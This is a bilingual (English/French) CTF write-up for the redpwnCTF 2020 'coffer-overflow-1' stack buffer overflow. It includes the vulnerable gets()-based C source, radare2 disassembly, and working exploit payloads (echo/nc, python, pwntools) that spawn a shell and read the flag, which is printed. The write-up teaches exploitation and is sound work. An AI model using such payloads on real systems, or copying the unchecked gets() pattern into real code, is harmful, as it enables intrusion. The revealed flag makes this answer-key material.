# coffer-overflow-1

Author: [roerohan](https://github.com/roerohan)

avec des bouts d'autres WritesUp : https://ctftime.org/task/12109 

This is a simple buffer overflow challenge.

# Requirements

- Basic Buffer overflow.

# Source

- [coffer-overflow-1](./coffer-overflow-1).

```
The coffers keep getting stronger! You'll need to use the source, Luke.

nc 2020.redpwnc.tf 31255
```

```c
#include <stdio.h>
#include <string.h>

int main(void)
{
  long code = 0;
  char name[16];
  
  setbuf(stdout, NULL);
  setbuf(stdin, NULL);
  setbuf(stderr, NULL);

  puts("Welcome to coffer overflow, where our coffers are overfilling with bytes ;)");
  puts("What do you want to fill your coffer with?");

  gets(name);

  if(code == 0xcafebabe) {
    system("/bin/sh");
  }
}
```

# Exploitation

Check out [coffer-overflow-0](../coffer-overflow-0) for some details. You can checkout how buffer overflow works [here](https://github.com/csivitu/Incore-Sessions/blob/master/Buffer%20Overflow/Session-1.md).
<br />

Dans le source, on voit qu'il faut donner une valeur prédéfinie, `code == 0xcafebabe`. 

source: https://dunsp4rce.github.io/redpwn-2020/pwn/2020/06/26/coffer-overflow-1.html 

Outre cette valeur prédéfinie, on voit que `name` se voit allouer 16 bytes. 
<br />
We see in the code snippet that `name` is alloted 16 bytes, and `code` is alloted 8 bytes (long, 64-bit). 

Pour déterminer la quantité de brol à ajouter devant , ce writeup (https://dunsp4rce.github.io/redpwn-2020/pwn/2020/06/26/coffer-overflow-1.html) explique: 

```
From the disassembly of coffer-overflow-1, we can see that code is located at rbp - 0x8 and 
name is located at rbp - 0x20, meaning that we require 0x18 = 24 bytes of junk followed by 0xcafebabe as the input.
```
Concrètement, pour désassembler le binaire, Radare2 (https://www.megabeets.net/a-journey-into-radare-2-part-1/) (interface graphique : https://cutter.re/)
```
   $ r2 coffer-overflow-1
   [0x00400590]>
   
   [0x00400590]> afl
0x00400590    1 42           entry0
0x004005d0    4 42   -> 37   sym.deregister_tm_clones
0x00400600    4 58   -> 55   sym.register_tm_clones
0x00400640    3 34   -> 29   entry.fini0
0x00400670    1 7            entry.init0
0x00400780    1 2            sym.__libc_csu_fini
0x00400784    1 9            sym._fini
0x00400710    4 101          sym.__libc_csu_init
0x004005c0    1 2            sym._dl_relocate_static_pie
0x00400677    3 147          main
0x00400560    1 6            sym.imp.setbuf
0x00400550    1 6            sym.imp.puts
0x00400580    1 6            sym.imp.gets
0x00400570    1 6            sym.imp.system
0x00400528    3 23           sym._init


   [0x00400590]> s main
   
   [0x00400590]> pdf

```
permet de voir que: 

https://github.com/luckylex/screeshoot/blob/master/r2-1.png 
https://github.com/luckylex/screeshoot/blob/master/r2-2.png


<br />
Also, the `gets()` function is used, which does not check the size of the input. So, we can simply write past the space alloted for `name` and write into `code`, the value `0xcafebabe` in little endian.
<br />

Les différents writesup proposent ces solutions: 

https://github.com/satoki/ctf_writeups/tree/master/redpwnCTF_2020/coffer-overflow-1 

```
$ (echo -e "AAAAAAAAAAAAAAAAAAAAAAAA\xbe\xba\xfe\xca"; cat) | nc 2020.redpwnc.tf 31255
Welcome to coffer overflow, where our coffers are overfilling with bytes ;)
What do you want to fill your coffer with?
ls
Makefile
bin
coffer-overflow-1
coffer-overflow-1.c
dev
flag.txt
lib
lib32
lib64
cat flag.txt

```
https://dunsp4rce.github.io/redpwn-2020/pwn/2020/06/26/coffer-overflow-1.html 

```
python -c "print('abcdabcdabcdabcdabcdabcd\xbe\xba\xfe\xca\x00\x00\x00\x00\ncat flag.txt\n')" > payload
nc 2020.redpwnc.tf 31255 < payload
```


We can use `pwntools` for the same. As discussed in `coffer-overflow-0`, this function will take up 32 bytes in the stack. The last 8 will store `code`, so we can write 24 random characters followed by `0xcafebabe` in little endian.

```python
import pwn

r = pwn.remote('2020.redpwnc.tf', 31255)

rep = b'a'*24 + pwn.p64(0xcafebabe)
print(rep)
r.sendline(rep)
r.interactive()
```

Run this program using `python`.

```bash
$ python cof1.py 
[+] Opening connection to 2020.redpwnc.tf on port 31255: Done
b'aaaaaaaaaaaaaaaaaaaaaaaa\xbe\xba\xfe\xca\x00\x00\x00\x00'
[*] Switching to interactive mode
Welcome to coffer overflow, where our coffers are overfilling with bytes ;)
What do you want to fill your coffer with?
$ ls
Makefile
bin
coffer-overflow-1
coffer-overflow-1.c
dev
flag.txt
lib
lib32
lib64
$ cat flag.txt
flag{th1s_0ne_wasnt_pure_gu3ssing_1_h0pe}
```

The flag is:

```
flag{th1s_0ne_wasnt_pure_gu3ssing_1_h0pe}
```
